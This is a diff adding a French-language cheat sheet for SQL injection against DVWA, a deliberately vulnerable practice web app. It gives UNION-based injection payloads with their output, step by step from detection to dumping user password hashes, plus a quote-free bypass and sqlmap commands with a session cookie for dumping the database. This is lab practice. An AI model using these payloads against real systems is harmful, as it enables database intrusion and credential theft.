@@ -1,0 +1,66 @@
+#DVWA ---- Tricks ----- 
+
+### SQLi -- Easy ###
+
+1) Reperer la présence d'une SQLi :
+1' OR 1=1 -- 
+	=> Renvoie plusieurs colones au lieu d'une seule !
+
+2) Determiner le nombre de colones pour la requettes:
+1' OR 1<2 union all select 1,2 -- 
+First name: 1
+Surname: 2
+	=> Ecrit 1 puis 2 on a deux colones!
+
+3) Determiner la version MySql
+1' OR 1<2 union all select 1,@@version -- 
+First name: 1
+Surname: 5.5.24-log
+	=> Ecrit 1 puis le numero de version
+
+4) Determiner l'utilisateur de la bdd 
+1' OR 1<2 union all select 1,user() -- 
+First name: 1
+Surname: root@localhost
+	=> Ecrit le nom de l'utilisateur 
+
+5) Determiner le nom de la bdd 
+1' or 1<2 union all select 1,database() -- 
+First name: 1
+Surname: dvwa
+
+6) Determiner le nom des tables
+1' or 1<2 union all select  TABLE_SCHEMA,TABLE_NAME from information_schema.tables WHERE TABLE_SCHEMA="dvwa" -- 
+
+First name: dvwa
+Surname: guestbook
+ID: 1' or 1<2 union all select  TABLE_SCHEMA,TABLE_NAME from information_schema.tables WHERE TABLE_SCHEMA="dvwa" -- 
+First name: dvwa
+Surname: users
+
+7) Determiner le nom des colones 
+1' or 1<2 union all select NULL,CONCAT(TABLE_SCHEMA,0x2C,TABLE_NAME,0x2C,COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA="dvwa" -- 
+
+First name: 
+Surname: dvwa,users,user
+ID: 1' or 1<2 union all select NULL,CONCAT(TABLE_SCHEMA,0x2C,TABLE_NAME,0x2C,COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA="dvwa" -- 
+First name: 
+Surname: dvwa,users,password
+
+8) Recuperer les mots de passe : 
+
+1' or 1<2 union all select user,password from users -- 
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+### SQLi Medium ### 
+1) Protégé par mysql_real_escape_string => ne pas mettre de quotes
+1 or isnull(null) union all select user,password from users -- 
+
+
+### SQL Map ### 
+
+Inejctable ? 
+./sqlmap.py -u "http://192.168.1.29/DVWA-1.0.8/vulnerabilities/sqli/?id=NULL&Submit=Submit#" --cookie="PHPSESSID=jgd2rcebgff4v8583pq07g4ip6; security=low"  
+Dump :
+./sqlmap.py -u "http://192.168.1.29/DVWA-1.0.8/vulnerabilities/sqli/?id=NULL&Submit=Submit#" --cookie="PHPSESSID=jgd2rcebgff4v8583pq07g4ip6; security=low"  --dump
